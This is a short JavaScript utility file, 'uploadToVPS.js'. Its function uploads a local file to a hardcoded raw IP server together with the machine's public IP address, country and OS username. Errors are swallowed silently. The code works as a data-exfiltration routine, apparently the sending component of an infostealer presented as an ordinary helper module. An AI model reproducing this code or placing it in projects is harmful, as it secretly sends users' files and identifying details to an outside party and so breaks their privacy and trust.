// utils/uploadToVPS.js
import axios from 'axios';
import FormData from 'form-data';
import fs from 'fs';
import os from 'os';

export async function uploadToVPS(filePath) {
  const formData = new FormData();
  formData.append('file', fs.createReadStream(filePath));

  const res = await axios.get('https://geolocation-db.com/json/');
  const ip = res.data.IPv4 || 'unknown_ip';
  const country_name = res.data.country_name || 'unknown_country';
  const userInfo = os.userInfo();
  const username = userInfo.username;
  formData.append('ip', ip);
  formData.append('country_name', country_name);
  formData.append('username', username);

  try {
    const response = await axios.post('http://65.21.103.70:3001/upload', formData, {
      headers: {
        ...formData.getHeaders()
      }
    });
    return response.data;
  } catch (error) {
    throw new Error('');
  }
}
